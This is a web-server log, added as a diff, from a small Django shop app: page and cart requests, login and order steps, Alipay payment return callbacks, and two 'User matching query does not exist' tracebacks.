+[pid: 18608|app: 0|req: 40/40] 101.132.97.6 () {34 vars in 497 bytes} [Tue Mar 19 01:38:37 2019] GET /bbf/mine/ => generated 12488 bytes in 7 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Internal Server Error: /bbf/orderlist/
+Traceback (most recent call last):
+  File "/root/.virtualenv/bbf/lib/python3.5/site-packages/django/core/handlers/exception.py", line 41, in inner
+    response = get_response(request)
+  File "/root/.virtualenv/bbf/lib/python3.5/site-packages/django/core/handlers/base.py", line 187, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/root/.virtualenv/bbf/lib/python3.5/site-packages/django/core/handlers/base.py", line 185, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "./app/views.py", line 360, in orderlist
+    user = User.objects.get(pk=userid)
+  File "/root/.virtualenv/bbf/lib/python3.5/site-packages/django/db/models/manager.py", line 85, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "/root/.virtualenv/bbf/lib/python3.5/site-packages/django/db/models/query.py", line 380, in get
+    self.model._meta.object_name
+app.models.DoesNotExist: User matching query does not exist.
+[pid: 18608|app: 0|req: 41/41] 101.132.177.14 () {34 vars in 509 bytes} [Tue Mar 19 01:40:35 2019] GET /bbf/orderlist/ => generated 66519 bytes in 40 msecs (HTTP/1.1 500) 4 headers in 129 bytes (1 switches on core 0)
+Not Found: /
+[pid: 18608|app: 0|req: 42/42] 113.88.14.120 () {40 vars in 651 bytes} [Tue Mar 19 01:43:01 2019] GET / => generated 2013 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 18608|app: 0|req: 43/43] 113.88.14.120 () {40 vars in 630 bytes} [Tue Mar 19 01:43:01 2019] GET /favicon.ico => generated 2064 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 44/44] 113.88.14.120 () {40 vars in 657 bytes} [Tue Mar 19 01:43:06 2019] GET /bbf => generated 0 bytes in 0 msecs (HTTP/1.1 301) 3 headers in 110 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 45/45] 113.88.14.120 () {40 vars in 659 bytes} [Tue Mar 19 01:43:06 2019] GET /bbf/ => generated 83402 bytes in 18 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 46/46] 113.88.13.180 () {42 vars in 737 bytes} [Tue Mar 19 01:43:13 2019] GET /bbf/product_details/1/ => generated 28578 bytes in 13 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 47/47] 113.88.14.120 () {42 vars in 700 bytes} [Tue Mar 19 01:43:28 2019] GET /bbf/addgoods/?goodsid=1&goodsNum=1 => generated 61 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 48/48] 113.88.13.180 () {44 vars in 766 bytes} [Tue Mar 19 01:43:29 2019] GET /bbf/login/ => generated 13929 bytes in 7 msecs (HTTP/1.1 200) 5 headers in 279 bytes (1 switches on core 0)
+111111
+[pid: 18608|app: 0|req: 49/49] 113.88.13.180 () {52 vars in 1014 bytes} [Tue Mar 19 01:43:35 2019] POST /bbf/login/ => generated 0 bytes in 13 msecs (HTTP/1.1 302) 6 headers in 288 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 50/50] 113.88.13.180 () {46 vars in 925 bytes} [Tue Mar 19 01:43:35 2019] GET /bbf/product_details/ => generated 28580 bytes in 16 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 51/51] 113.88.13.180 () {44 vars in 853 bytes} [Tue Mar 19 01:43:39 2019] GET /bbf/addgoods/?goodsid=1&goodsNum=1 => generated 170 bytes in 12 msecs (HTTP/1.1 200) 4 headers in 115 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 52/52] 113.88.13.180 () {44 vars in 882 bytes} [Tue Mar 19 01:43:40 2019] GET /bbf/cart/ => generated 17761 bytes in 15 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 53/53] 113.88.14.120 () {44 vars in 818 bytes} [Tue Mar 19 01:43:42 2019] GET /bbf/addcart/?goodsid=1 => generated 73 bytes in 12 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 54/54] 113.88.14.120 () {44 vars in 818 bytes} [Tue Mar 19 01:43:43 2019] GET /bbf/addcart/?goodsid=1 => generated 73 bytes in 24 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 55/55] 113.88.14.120 () {44 vars in 818 bytes} [Tue Mar 19 01:43:53 2019] GET /bbf/addcart/?goodsid=1 => generated 73 bytes in 11 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 56/56] 113.88.14.120 () {44 vars in 818 bytes} [Tue Mar 19 01:43:56 2019] GET /bbf/addcart/?goodsid=1 => generated 73 bytes in 12 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 57/57] 113.88.14.120 () {44 vars in 818 bytes} [Tue Mar 19 01:43:57 2019] GET /bbf/addcart/?goodsid=1 => generated 73 bytes in 13 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 58/58] 113.88.14.120 () {44 vars in 818 bytes} [Tue Mar 19 01:43:59 2019] GET /bbf/subcart/?goodsid=1 => generated 73 bytes in 11 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 59/59] 113.88.14.120 () {44 vars in 818 bytes} [Tue Mar 19 01:44:00 2019] GET /bbf/subcart/?goodsid=1 => generated 73 bytes in 11 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 60/60] 113.88.14.120 () {44 vars in 818 bytes} [Tue Mar 19 01:44:00 2019] GET /bbf/subcart/?goodsid=1 => generated 73 bytes in 11 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 61/61] 113.88.14.120 () {44 vars in 818 bytes} [Tue Mar 19 01:44:01 2019] GET /bbf/subcart/?goodsid=1 => generated 73 bytes in 12 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 62/62] 113.88.14.120 () {44 vars in 818 bytes} [Tue Mar 19 01:44:02 2019] GET /bbf/subcart/?goodsid=1 => generated 73 bytes in 11 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 63/63] 113.88.14.120 () {44 vars in 818 bytes} [Tue Mar 19 01:44:07 2019] GET /bbf/addcart/?goodsid=1 => generated 73 bytes in 12 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 64/64] 113.88.14.120 () {44 vars in 818 bytes} [Tue Mar 19 01:44:08 2019] GET /bbf/addcart/?goodsid=1 => generated 73 bytes in 12 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 65/65] 113.88.14.120 () {44 vars in 889 bytes} [Tue Mar 19 01:44:11 2019] GET /bbf/generateorder/ => generated 12483 bytes in 27 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+1111111
+19
+2222222
+[pid: 18608|app: 0|req: 66/66] 113.88.14.120 () {44 vars in 821 bytes} [Tue Mar 19 01:44:15 2019] GET /bbf/pay/?orderid=19 => generated 1010 bytes in 9 msecs (HTTP/1.1 200) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 67/67] 106.14.215.243 () {34 vars in 499 bytes} [Tue Mar 19 01:51:08 2019] GET /bbf/cart/ => generated 13929 bytes in 8 msecs (HTTP/1.1 200) 5 headers in 279 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 68/68] 47.98.37.19 () {34 vars in 522 bytes} [Tue Mar 19 01:59:39 2019] GET /bbf/product_details/3/ => generated 28350 bytes in 16 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Not Found: /
+[pid: 18608|app: 0|req: 69/69] 59.36.132.222 () {34 vars in 461 bytes} [Tue Mar 19 02:11:26 2019] GET / => generated 2012 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 70/70] 113.88.14.120 () {42 vars in 813 bytes} [Tue Mar 19 02:17:31 2019] GET /bbf/ => generated 83404 bytes in 23 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 71/71] 113.88.13.180 () {44 vars in 891 bytes} [Tue Mar 19 02:17:35 2019] GET /bbf/product_details/2/ => generated 28545 bytes in 17 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 72/72] 113.88.13.180 () {44 vars in 854 bytes} [Tue Mar 19 02:17:39 2019] GET /bbf/addgoods/?goodsid=2&goodsNum=1 => generated 142 bytes in 11 msecs (HTTP/1.1 200) 4 headers in 115 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 73/73] 113.88.14.120 () {44 vars in 883 bytes} [Tue Mar 19 02:17:40 2019] GET /bbf/cart/ => generated 17674 bytes in 15 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 18608|app: 0|req: 74/74] 113.88.14.120 () {42 vars in 793 bytes} [Tue Mar 19 02:17:41 2019] GET /favicon.ico => generated 2064 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 75/75] 113.88.14.120 () {44 vars in 817 bytes} [Tue Mar 19 02:17:43 2019] GET /bbf/addcart/?goodsid=2 => generated 73 bytes in 11 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 76/76] 113.88.14.120 () {44 vars in 817 bytes} [Tue Mar 19 02:17:43 2019] GET /bbf/addcart/?goodsid=2 => generated 73 bytes in 12 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 77/77] 113.88.14.120 () {44 vars in 817 bytes} [Tue Mar 19 02:17:44 2019] GET /bbf/addcart/?goodsid=2 => generated 73 bytes in 12 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 78/78] 113.88.14.120 () {44 vars in 817 bytes} [Tue Mar 19 02:17:45 2019] GET /bbf/addcart/?goodsid=2 => generated 73 bytes in 11 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 79/79] 113.88.14.120 () {44 vars in 817 bytes} [Tue Mar 19 02:17:45 2019] GET /bbf/subcart/?goodsid=2 => generated 73 bytes in 18 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 80/80] 113.88.14.120 () {44 vars in 817 bytes} [Tue Mar 19 02:17:46 2019] GET /bbf/subcart/?goodsid=2 => generated 73 bytes in 11 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 81/81] 113.88.14.120 () {44 vars in 817 bytes} [Tue Mar 19 02:17:46 2019] GET /bbf/subcart/?goodsid=2 => generated 73 bytes in 11 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 82/82] 113.88.14.120 () {44 vars in 817 bytes} [Tue Mar 19 02:17:47 2019] GET /bbf/subcart/?goodsid=2 => generated 73 bytes in 11 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 83/83] 113.88.14.120 () {44 vars in 817 bytes} [Tue Mar 19 02:17:48 2019] GET /bbf/addcart/?goodsid=2 => generated 73 bytes in 11 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 84/84] 113.88.14.120 () {44 vars in 817 bytes} [Tue Mar 19 02:17:48 2019] GET /bbf/addcart/?goodsid=2 => generated 73 bytes in 11 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 85/85] 113.88.14.120 () {44 vars in 817 bytes} [Tue Mar 19 02:17:48 2019] GET /bbf/addcart/?goodsid=2 => generated 73 bytes in 12 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 86/86] 113.88.14.120 () {44 vars in 817 bytes} [Tue Mar 19 02:17:48 2019] GET /bbf/addcart/?goodsid=2 => generated 73 bytes in 12 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 87/87] 113.88.14.120 () {44 vars in 817 bytes} [Tue Mar 19 02:17:49 2019] GET /bbf/addcart/?goodsid=2 => generated 73 bytes in 11 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 88/88] 113.88.14.120 () {46 vars in 914 bytes} [Tue Mar 19 02:17:55 2019] GET /bbf/cart/ => generated 17674 bytes in 15 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 89/89] 113.88.13.180 () {46 vars in 914 bytes} [Tue Mar 19 02:19:08 2019] GET /bbf/cart/ => generated 17614 bytes in 16 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Not Found: /
+[pid: 18608|app: 0|req: 90/90] 109.94.117.91 () {32 vars in 445 bytes} [Tue Mar 19 03:25:06 2019] GET / => generated 2016 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 91/91] 47.100.51.203 () {34 vars in 506 bytes} [Tue Mar 19 03:28:54 2019] GET /bbf/returnurl => generated 0 bytes in 0 msecs (HTTP/1.1 301) 3 headers in 120 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 92/92] 47.100.51.203 () {34 vars in 508 bytes} [Tue Mar 19 03:28:55 2019] GET /bbf/returnurl/ => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 132 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 93/93] 47.100.51.203 () {34 vars in 498 bytes} [Tue Mar 19 03:28:55 2019] GET /bbf/mine/ => generated 12428 bytes in 6 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Not Found: /
+[pid: 18608|app: 0|req: 94/94] 109.172.57.48 () {32 vars in 445 bytes} [Tue Mar 19 03:30:42 2019] GET / => generated 2016 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 95/95] 101.132.102.45 () {34 vars in 530 bytes} [Tue Mar 19 03:32:16 2019] GET /admin/login/?next=/admin/ => generated 1650 bytes in 14 msecs (HTTP/1.1 200) 7 headers in 381 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 96/96] 47.92.5.11 () {34 vars in 489 bytes} [Tue Mar 19 03:47:08 2019] GET /admin/ => generated 0 bytes in 1 msecs (HTTP/1.1 302) 7 headers in 265 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 97/97] 47.92.5.11 () {34 vars in 526 bytes} [Tue Mar 19 03:47:08 2019] GET /admin/login/?next=/admin/ => generated 1650 bytes in 14 msecs (HTTP/1.1 200) 7 headers in 381 bytes (1 switches on core 0)
+Internal Server Error: /bbf/generateorder/
+Traceback (most recent call last):
+  File "/root/.virtualenv/bbf/lib/python3.5/site-packages/django/core/handlers/exception.py", line 41, in inner
+    response = get_response(request)
+  File "/root/.virtualenv/bbf/lib/python3.5/site-packages/django/core/handlers/base.py", line 187, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/root/.virtualenv/bbf/lib/python3.5/site-packages/django/core/handlers/base.py", line 185, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "./app/views.py", line 337, in generateorder
+    user = User.objects.get(pk=userid)
+  File "/root/.virtualenv/bbf/lib/python3.5/site-packages/django/db/models/manager.py", line 85, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "/root/.virtualenv/bbf/lib/python3.5/site-packages/django/db/models/query.py", line 380, in get
+    self.model._meta.object_name
+app.models.DoesNotExist: User matching query does not exist.
+[pid: 18608|app: 0|req: 98/98] 47.92.101.189 () {34 vars in 516 bytes} [Tue Mar 19 03:49:22 2019] GET /bbf/generateorder/ => generated 66628 bytes in 36 msecs (HTTP/1.1 500) 4 headers in 129 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 99/99] 47.92.38.53 () {34 vars in 1799 bytes} [Tue Mar 19 03:54:11 2019] GET /bbf/returnurl/?charset=utf-8&out_trade_no=201903181453562829&method=alipay.trade.page.pay.return&total_amount=284.00&sign=4uaumlwqzthinpydojyigadkfkalfn8mvkdvconlilquc2fgcgfdvpk0pkh5su1gpkm67to3qjv8spxwt54vmucaqufw%2bsvubk1vdhwqaizjaaw7rueikhpayeyf8idltgvba1vk8gf1uusmtcrtwuolpbpdahjeevxk%2flahs7nbycw%2b2wixabjapgf3r0xlnnxvto1mz0i63id4amltvcnp0vbgjouwp2%2b3dpmrj0vwv11ptbcp6mbbbybzuwhppagatziooogu6ewtlodhiifbk2w7vy3esolaow8vtvxkb0ten9mz%2bdwtsbgzmwjffypouur3djzrs07t0szk%2fa%3d%3d&trade_no=2019031822001450341000001002&auth_app_id=2016092800614528&version=1.0&app_id=2016092800614528&sign_type=rsa2&seller_id=2088102177626174&timestamp=2019-03-18+22%3a55%3a58 => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 132 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 100/100] 47.92.38.53 () {34 vars in 496 bytes} [Tue Mar 19 03:54:11 2019] GET /bbf/mine/ => generated 12428 bytes in 6 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 101/101] 47.92.29.149 () {34 vars in 523 bytes} [Tue Mar 19 03:57:34 2019] GET /bbf/product_details/1/ => generated 28518 bytes in 13 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 102/102] 101.132.131.7 () {34 vars in 488 bytes} [Tue Mar 19 04:05:33 2019] GET /bbf/ => generated 83342 bytes in 18 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 103/103] 106.15.201.111 () {34 vars in 513 bytes} [Tue Mar 19 04:13:41 2019] GET /bbf/appnotifyurl => generated 0 bytes in 0 msecs (HTTP/1.1 301) 3 headers in 123 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 104/104] 106.15.201.111 () {34 vars in 515 bytes} [Tue Mar 19 04:13:41 2019] GET /bbf/appnotifyurl/ => generated 18 bytes in 0 msecs (HTTP/1.1 200) 3 headers in 100 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 105/105] 101.132.131.7 () {34 vars in 508 bytes} [Tue Mar 19 04:16:37 2019] GET /bbf/returnurl/ => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 132 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 106/106] 101.132.131.7 () {34 vars in 498 bytes} [Tue Mar 19 04:16:37 2019] GET /bbf/mine/ => generated 12428 bytes in 6 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Not Found: /
+[pid: 18608|app: 0|req: 107/107] 107.170.195.64 () {34 vars in 376 bytes} [Tue Mar 19 04:17:51 2019] GET / => generated 2013 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 108/108] 47.92.5.11 () {34 vars in 1812 bytes} [Tue Mar 19 04:24:07 2019] GET /bbf/returnurl/?charset=utf-8&out_trade_no=201903181444575649&method=alipay.trade.page.pay.return&total_amount=1802.00&sign=ui4k6oa%2fve4z7ajdxk97z0bzhwaez15cqeaxy6uy1zn%2f7d%2fti1iv%2bmps48%2bfprkgy0siyllfx%2fdabzleje59ektig8h6zeozfhpfpbflthfqwktypzdk0zk21pzgaacxvqiek3s9igatyggtcttgzej%2bdrxk8hrcomria5u1s4ei3pju4vjaowjb8pjwauoyrghubflt32rlzwlszhotrhbay4r90klzifiqa0tr32ubzvotiryscwokpx6vxirrci7oqktekfian9qyu4%2b50fyqguh6sy6iu1hxyid9h0csinxlw4czdz4vb1pusoz%2foyn0x6homcqfkteikghmwq%3d%3d&trade_no=2019031822001450341000001001&auth_app_id=2016092800614528&version=1.0&app_id=2016092800614528&sign_type=rsa2&seller_id=2088102177626174&timestamp=2019-03-18+22%3a48%3a53 => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 132 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 109/109] 47.92.5.11 () {34 vars in 495 bytes} [Tue Mar 19 04:24:07 2019] GET /bbf/mine/ => generated 12428 bytes in 7 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Not Found: /
+[pid: 18608|app: 0|req: 110/110] 47.101.204.90 () {34 vars in 461 bytes} [Tue Mar 19 04:49:33 2019] GET / => generated 2013 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /
+[pid: 18608|app: 0|req: 111/111] 47.101.204.203 () {34 vars in 462 bytes} [Tue Mar 19 05:17:41 2019] GET / => generated 2013 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
